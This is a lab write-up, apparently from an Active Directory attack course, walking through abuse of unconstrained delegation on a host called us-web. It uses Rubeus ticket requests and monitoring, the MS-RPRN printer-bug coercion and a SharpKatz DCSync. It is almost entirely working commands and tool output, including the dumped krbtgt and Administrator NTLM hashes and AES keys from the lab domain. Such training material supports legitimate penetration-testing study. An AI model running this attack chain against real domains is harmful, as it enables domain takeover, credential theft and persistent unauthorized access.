# Hands-On 24:

``
Abuse the Unconstrained Delegation on us-web to get Enterprise Admin privileges on
usvendor.local.
``

## Index of content:

  1. [Unconstrained delegation us vendor](#unconstrainde-delegation-us-vendor)


## Unconstrained delegation us vendor

Create new cmd with webmaster user on attacker student machine using ptt 
```
C:\Windows\system32>C:\AD\Tools\Rubeus.exe asktgt /domain:us.techcorp.local /user:webmaster /aes256:2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGT

[*] Showing process : True
[*] Username        : K9YDLA02
[*] Domain          : EA6TIOPB
[*] Password        : HQB8Z161
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 5084
[+] LUID            : 0xa6453bb

[*] Using domain controller: US-DC.us.techcorp.local (192.168.1.2)
[!] Pre-Authentication required!
[!]     AES256 Salt: US.TECHCORP.LOCALwebmaster
[*] Using aes256_cts_hmac_sha1 hash: 2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0
[*] Building AS-REQ (w/ preauth) for: 'us.techcorp.local\webmaster'
[*] Target LUID : 174347195
[*] Using domain controller: 192.168.1.2:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFujCCBbagAwIBBaEDAgEWooIErzCCBKthggSnMIIEo6ADAgEFoRMbEVVTLlRFQ0hDT1JQLkxPQ0FM
      oiYwJKADAgECoR0wGxsGa3JidGd0GxFVUy5URUNIQ09SUC5MT0NBTKOCBF0wggRZoAMCARKhAwIBAqKC
      BEsEggRH52kEd+q6uPczFNrExk8if7P0r9xCHScggfzYo4/nxD0SwnMNZgfTVBA3k78g2f7GyMDs8CRJ
      UAyPNqo/fk58etFecmnQEhA6nz0e1noEoi9tD6esX1agjhVv/Wfh8rVCW5/+pRQfM1tvvfNnNiW57YJb
      d7JzDv/sQxB8UvHIyL6Nzlzd3IDEEdG5sIXPu8tsXzj0jjDWp2DfgbtYkkMjcgIwGVdDhItXBGkqITfh
      44A0ytscdlbiAvbk4/7Df7N2FpWi/dOGMEQnqPVIi9cdMh+oc5oCJNdgAWW8srakEEA7CMiskv3TSFU3
      5+zAFbc8/6Ce2jkfZDRo5ijdkiPc3JK75Dr2OrkkWthTXQnyehQiyuNl2n86tMPG2ZFv06YTDh5JLB8h
      dGohp0ExyqlwcE15aJdvXeaRz4ZhFx+gAEwzqIW3szDtD7Ob5MfkNuK9NOO6kvSAyYo6rCV8PAgvUcWZ
      XcL2keLR3rFfOSavk2FuD/Zhu+1x4yxu6gkG7zU3izqlSAytSZ1KbxE6a5X8caO6FMTFbrt3MyBVZG4+
      jBR2F7mN5+YcHYwjdKpeFvJDDv9cZtK0isJy1/rCZORDc9JSEtaMtWaEP1ir9d/yCDz4PD0fhkP/UZKO
      CaZM7nK7pbNNXSnT75o0xrqelTyYtlYqs1xqaHraWr3kIskNMLs+aslVXLC0qI1a5uc0dtNtecMMYTcv
      vPxcOiS5QPcgO29wKcmT7UVjygU/DjDhkboLkaeOmoHxh3nT8Ud3S44fZtFAUa+E/5m2cPivvCm6nEQ1
      6+8h2AVc8CXO1PLwvc1i6fd9oKzmcG4Sb8/qZhOj8aqA6A1hmRkGzAlAtYR/6C19Wb4+C3aocmUf7BgT
      iyFdyEUFU+qBLjcTXe457PwaS7YTPjyhLV/BZ44KD6uYrX5I1aYMBUd0GsQis7Fyjd9Ysf5rtUZmrmyi
      zlhMOHffx0CiquYnBGSaVVKCEp0/AKdtLCJu/FSb+qJlXL07XcQShx1zFrXg4wNSjuJgcSoWn5Ro6ArX
      KNYrjStF78JTH1hJINZ/IPGcCtik+l3/osOTPvjvR4upQZJXfGtcHnglmGj4zVENNIUGdBetfi5DwpT5
      WsTwGZmxam14Vz6cIXvPD0uwsGCKkrCJQGTtR9im4NY4s4dDJgESanMeE9rDHYgivm7bnq9g560rfEqS
      rb6G0ewke9hOGe2Jbih+uKqm1dI5B+wcv55FSCxjMAhYjeAU5dbP12n+uZjGnyCNFkBUeKR5tlW3x9WF
      mJRAY9QKvahzw47PCitNAIiMvGPgYj+mXg8BKQ+Sk/4TAauYX0WsXDUahOxt2k07+Ab9zRkACXwUpQ1H
      7s0H92Ko9B1KkR2UQjAO++DoDHLJDHShaOy6S9nW6yrFXAW880dKoiSERGL543yFimI9hm5rl8LxJIqU
      430eaArGo0a4VSVtCDzXJzY7HRsRo4H2MIHzoAMCAQCigesEgeh9geUwgeKggd8wgdwwgdmgKzApoAMC
      ARKhIgQgiuEJqLSye3NDyESM4L6/JtKqimQPWLhCf6cKKf6Ww0mhExsRVVMuVEVDSENPUlAuTE9DQUyi
      FjAUoAMCAQGhDTALGwl3ZWJtYXN0ZXKjBwMFAEDhAAClERgPMjAyMzAzMDMxOTAwNDlaphEYDzIwMjMw
      MzA0MDUwMDQ5WqcRGA8yMDIzMDMxMDE5MDA0OVqoExsRVVMuVEVDSENPUlAuTE9DQUypJjAkoAMCAQKh
      HTAbGwZrcmJ0Z3QbEVVTLlRFQ0hDT1JQLkxPQ0FM
[*] Target LUID: 0xa6453bb
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/US.TECHCORP.LOCAL
  ServiceRealm             :  US.TECHCORP.LOCAL
  UserName                 :  webmaster
  UserRealm                :  US.TECHCORP.LOCAL
  StartTime                :  3/3/2023 11:00:49 AM
  EndTime                  :  3/3/2023 9:00:49 PM
  RenewTill                :  3/10/2023 11:00:49 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  iuEJqLSye3NDyESM4L6/JtKqimQPWLhCf6cKKf6Ww0k=
  ASREP (key)              :  2A653F166761226EB2E939218F5A34D3D2AF005A91F160540DA6E4A5E29DE8A0

```

On the new terminal copy the rubeus binary to the us-web machine that contains the unconstrined delegation and accesss in order tu run the rubeus binary on monitoring mode:
```
C:\Windows\system32>echo F | xcopy C:\AD\Tools\Rubeus.exe \\us-web\C$\Users\Public\Rubeus.exe /Y
Does \\us-web\C$\Users\Public\Rubeus.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\Rubeus.exe
1 File(s) copied

C:\Windows\system32>winrs -r:us-web cmd.exe
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\webmaster>C:\Users\Public\Rubeus.exe monitor /targetuser:usvendor-dc$ /interval:5 /nowrap
C:\Users\Public\Rubeus.exe monitor /targetuser:usvendor-dc$ /interval:5 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: TGT Monitoring
[*] Target user     : usvendor-dc$
[*] Monitoring every 5 seconds for new TGTs
 ```

Form the attacker machine in other terminal, launch the printer bug binary:

```
C:\Users\studentuser17>C:\AD\Tools\MS-RPRN.exe \\usvendor-dc.usvendor.local \\us-web.us.techcorp.local
Target server attempted authentication and got an access denied.  If coercing authentication to an NTLM challenge-response capture tool(e.g. responder/inveigh/MSF SMB capture), this is expected and indicates the coerced authentication worked.
```

On the previous monitoring process on us-web machine we rcievd the TGS ticket:

```

```

Import the ticket:
```
C:\AD\Tools\Rubeus.exe ptt /ticket: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

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1


[*] Action: Import Ticket
[+] Ticket successfully imported!
```

validate the imported TGTs with klist:
```
C:\Windows\system32>klist

Current LogonId is 0:0x738a20d

Cached Tickets: (1)

#0>     Client: USVENDOR-DC$ @ USVENDOR.LOCAL
        Server: krbtgt/USVENDOR.LOCAL @ USVENDOR.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 3/3/2023 5:39:59 (local)
        End Time:   3/3/2023 15:39:59 (local)
        Renew Time: 3/9/2023 20:07:49 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

```

Perform a dcsync attack for krbtgt user:
```
C:\Windows\system32>C:\AD\Tools\SharpKatz.exe --Command dcsync --User usvendor\krbtgt --Domain usvendor.local --DomainController usvendor-dc.usvendor.local
[*]
[*]                     System Information
[*] ----------------------------------------------------------------------
[*] | Platform: Win32NT                                                  |
[*] ----------------------------------------------------------------------
[*] | Major: 10            | Minor: 0             | Build: 17763         |
[*] ----------------------------------------------------------------------
[*] | Version: Microsoft Windows NT 6.2.9200.0                           |
[*] ----------------------------------------------------------------------
[*]
[!] usvendor.local will be the domain
[!] usvendor-dc.usvendor.local will be the DC server
[!] usvendor\krbtgt will be the user account
[*]
[*] Object RDN           : krbtgt
[*]
[*] ** SAM ACCOUNT **
[*]
[*] SAM Username         : krbtgt
[*] User Principal Name  :
[*] Account Type         : USER_OBJECT
[*] User Account Control : ACCOUNTDISABLE, NORMAL_ACCOUNT
[*] Account expiration   : 12/31/9999 11:59:59 PM
[*] Password last change : 7/12/2019 10:09:18 PM
[*] Object Security ID   : S-1-5-21-2028025102-2511683425-2951839092-502
[*] Object Relative ID   : 502
[*]
[*] Credents:
[*] Hash NTLM            : 335caf1a29240a5dd318f79b6deaf03f
[*] ntlm- 0              : 335caf1a29240a5dd318f79b6deaf03f
[*] lm  - 0              : f3e8466294404a3eef79097e975bda3b
[*]
[*] Supplemental Credents:
[*]
[*]  * Primary:NTLM-Strong-NTOWF
[*]     Random Value : 11d7fc894b21e11d24a81c7870eb8aae
[*]
[*]  * Primary:Kerberos-Newer-Keys
[*]     Default Salt :USVENDOR.LOCALkrbtgt
[*]     Credents
[*]     aes256_hmac       4096: 2b0b8bf77286337369f38d1d72d3705fda18496989ab1133b401821684127a79
[*]     aes128_hmac       4096: 71995c47735a10ea4a107bfe2bf38cb6
[*]     des_cbc_md5       4096: 982c3125f116b901
[*]     ServiceCredents
[*]     OldCredents
[*]     OlderCredents
[*]
[*]  * Primary:Kerberos
[*]     Default Salt :USVENDOR.LOCALkrbtgt
[*]     Credents
[*]     des_cbc_md5       : 982c3125f116b901
[*]     OldCredents
[*]
[*]  * Packages
[*]     NTLM-Strong-NTOWF Kerberos-Newer-Keys Kerberos WDigest
[*]
[*]  * Primary:WDigest
[*]     01 99585c6025e58e1ac33c85f8a9ff8d18
[*]     02 c8dd05c8afc5d2b401e42ee135e7322f
[*]     03 b8ada0a86cd88445cea44dc839be89e2
[*]     04 99585c6025e58e1ac33c85f8a9ff8d18
[*]     05 c8dd05c8afc5d2b401e42ee135e7322f
[*]     06 f1a9058fe1f96297d9358a6ee70f3d0a
[*]     07 99585c6025e58e1ac33c85f8a9ff8d18
[*]     08 3e9f24f6600eb0613abf6a827e1579b4
[*]     09 3e9f24f6600eb0613abf6a827e1579b4
[*]     10 b31d574308dfbfc7359959269c9e062f
[*]     11 1e1b957757cfb97ea2cb6abaa00d37e4
[*]     12 3e9f24f6600eb0613abf6a827e1579b4
[*]     13 4c60e3254aa38c7eab2cc87ee5936665
[*]     14 1e1b957757cfb97ea2cb6abaa00d37e4
[*]     15 35105693dc1e8604a2e6d83fc4df54d5
[*]     16 35105693dc1e8604a2e6d83fc4df54d5
[*]     17 ce56ccf6a0d06664c7283ba6ab6f45b5
[*]     18 d6724265605922c57a12aae62411cddf
[*]     19 398eadef9fd48e9dd8574597d99a5e1e
[*]     20 50bcfec6ba9dd547d848b6795597fc66
[*]     21 5415bba00be1f4d402e290b87a5dc0a4
[*]     22 5415bba00be1f4d402e290b87a5dc0a4
[*]     23 040c18e4aa28bb2aeca69502bd1ce9da
[*]     24 fdd7b9a41f5392c5850c447dc26524a5
[*]     25 fdd7b9a41f5392c5850c447dc26524a5
[*]     26 3e58897c36a6045ceda494ecf08da9d9
[*]     27 689dca94f881ecba2ce4a13a1c9d2a26
[*]     28 0864b3b7df08ba05d95c877570a62ef7
[*]     29 7daa8ba2616ae1f75d9a7e9fe6cddc17
[*]

```

Perform a dcsync attack for Administrator user:

```
C:\Windows\system32>C:\AD\Tools\SharpKatz.exe --Command dcsync --User usvendor\Administrator --Domain usvendor.local --DomainController usvendor-dc.usvendor.local
[*]
[*]                     System Information
[*] ----------------------------------------------------------------------
[*] | Platform: Win32NT                                                  |
[*] ----------------------------------------------------------------------
[*] | Major: 10            | Minor: 0             | Build: 17763         |
[*] ----------------------------------------------------------------------
[*] | Version: Microsoft Windows NT 6.2.9200.0                           |
[*] ----------------------------------------------------------------------
[*]
[!] usvendor.local will be the domain
[!] usvendor-dc.usvendor.local will be the DC server
[!] usvendor\Administrator will be the user account
[*]
[*] Object RDN           : Administrator
[*]
[*] ** SAM ACCOUNT **
[*]
[*] SAM Username         : Administrator
[*] User Principal Name  :
[*] Account Type         : USER_OBJECT
[*] User Account Control : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD
[*] Account expiration   : 12/31/1600 4:00:00 PM
[*] Password last change : 7/12/2019 9:59:34 PM
[*] Object Security ID   : S-1-5-21-2028025102-2511683425-2951839092-500
[*] Object Relative ID   : 500
[*]
[*] Credents:
[*] Hash NTLM            : 67ad980708fe40f846c9397ec051020b
[*]
[*] Supplemental Credents:
[*]
[*]  * Primary:NTLM-Strong-NTOWF
[*]     Random Value : d67c7b91a5d229b531d5a8b3d151f0b8
[*]
[*]  * Primary:Kerberos-Newer-Keys
[*]     Default Salt :USVENDOR-DCAdministrator
[*]     Credents
[*]     aes256_hmac       4096: 17718f4898a31b97f7cc3437b148cbc1ac3ce7c827e8cfef7ccc1332887bb099
[*]     aes128_hmac       4096: 968ce2f6961da0abd4ecb73d7a4456ef
[*]     des_cbc_md5       4096: 2fd06d3b02457c01
[*]     ServiceCredents
[*]     OldCredents
[*]     aes256_hmac       4096: 8bdd104ff5562fe365fb0157e3267ee1775b10cc8ec0b900d728f9bdb8a0722f
[*]     aes128_hmac       4096: 0dc56cd7d05a4bb70a4028f1007df6d7
[*]     des_cbc_md5       4096: d368cd9167c85792
[*]     OlderCredents
[*]     aes256_hmac       4096: 6ee5d99e81fd6bdd2908243ef1111736132f4b107822e4eebf23a18ded385e61
[*]     aes128_hmac       4096: 6508ee108b9737e83f289d79ea365151
[*]     des_cbc_md5       4096: 31435d975783d0d0
[*]
[*]  * Packages
[*]     NTLM-Strong-NTOWF Kerberos-Newer-Keys Kerberos
[*]
[*]  * Primary:Kerberos
[*]     Default Salt :USVENDOR-DCAdministrator
[*]     Credents
[*]     des_cbc_md5       : 2fd06d3b02457c01
[*]     OldCredents
[*]     des_cbc_md5       : d368cd9167c85792
[*]

```
